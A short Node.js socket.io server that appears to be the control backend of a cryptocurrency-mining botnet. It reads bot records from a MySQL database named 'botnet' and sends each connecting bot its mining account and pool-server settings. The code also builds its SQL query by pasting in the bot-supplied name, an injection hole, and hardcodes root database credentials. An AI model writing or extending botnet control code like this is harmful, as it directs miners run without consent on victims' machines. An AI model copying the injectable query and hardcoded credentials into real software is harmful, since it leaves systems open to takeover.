var app = require('express')();
var mysql = require('mysql')
var server = require('http').Server(app);
var io = require('socket.io')(server);
var port = 8080;

console.log("listening on port: " + port);

var db = mysql.createConnection({
    host: 'localhost',
    user: 'root',
    password : 'toor',
    database: 'botnet'
})
 
// Log any errors connected to the db
db.connect(function(err){
    if (err) {
        console.log(err);
    }else{
        console.log("Database Connection Succesfull");
    }
});

io.sockets.on('connection', function(socket){
    console.log("algo se conecto Socket_ID->" + socket.id);  
    socket.on("initBot" , function(data){
        console.log("Inicializamos el bot con el nombre -> " + data.name);
        db.query("SELECT b.id, b.name, b.status , c.account , miningStatus , c.poolServer1 , c.portPoolServer1 , c.poolServer2 , c.portPoolServer2 , c.timeout FROM tblbots b inner join tblConfiguration c ON c.id = 1 WHERE b.name ='" +data.name + "'", function (error, results, fields) {
            if (error) throw error;            
            socket.emit("initBot_response",results[0]);            
        });             
    });
});


server.listen(port);